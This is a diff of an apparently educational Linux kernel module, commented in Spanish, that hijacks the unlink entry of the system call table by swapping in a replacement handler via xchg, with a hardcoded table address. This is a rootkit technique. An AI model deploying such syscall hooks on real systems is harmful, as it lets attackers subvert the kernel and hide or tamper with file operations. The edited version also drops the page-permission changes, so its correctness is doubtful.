@@ -20,10 +20,6 @@ MODULE_LICENSE("GPL");
 //realizar cada vez que se reinicie el sistema puesto que la direccion cambia
 #define dir_systable 0xffffffff85e00200
 
-
-
-
-
 unsigned long *sys_call_table = (unsigned long*) dir_systable;
 
 //puntero de la funcion del sys_openat
@@ -79,11 +75,11 @@ static int __init init_my_module(void)
 	//para este ejemplo se utiliza la llamada al sistema openat para abir archivos
 	printk(KERN_INFO "Inside kernel space\n");
 	//cambiando permisos de la pagina
-	make_rw((unsigned long)sys_call_table);
+	//make_rw((unsigned long)sys_call_table);
 	//guardando el valor de memoria de la llamada original
-	original_sys_unlink = (void *)sys_call_table[__NR_unlink];
+	original_sys_unlink = (void *)xchg(&sys_call_table[__NR_unlink], hacked_sys_unlink);
 	//insertando nuestra funcion a la direccion de memoria de openat
-	*(sys_call_table + __NR_unlink) = (unsigned long) hacked_sys_unlink;
+	//*(sys_call_table + __NR_unlink) = (unsigned long) hacked_sys_unlink;
 	printk("hizo el cambio de pagina \n");
 	return 0;
 }
@@ -92,11 +88,12 @@ static void __exit cleanup_my_module(void)
 {
 	
 	//cambiando la direccion de memoria a modo de escritura
-	make_rw((unsigned long)sys_call_table);
+	//make_rw((unsigned long)sys_call_table);
 	//regresando la funcion original a la direccion de la llamada
-	*(sys_call_table + __NR_unlink) = (unsigned long)original_sys_unlink;
+	//*(sys_call_table + __NR_unlink) = (unsigned long)original_sys_unlink;
 	//cambiando la direccion de memoria a modo de lectura. 
-	make_ro((unsigned long)sys_call_table);
+	xchg(&sys_call_table[__NR_unlink], original_sys_unlink);
+	//make_ro((unsigned long)sys_call_table);
 	printk(KERN_INFO "Exiting kernel space\n");
 	return;
 }
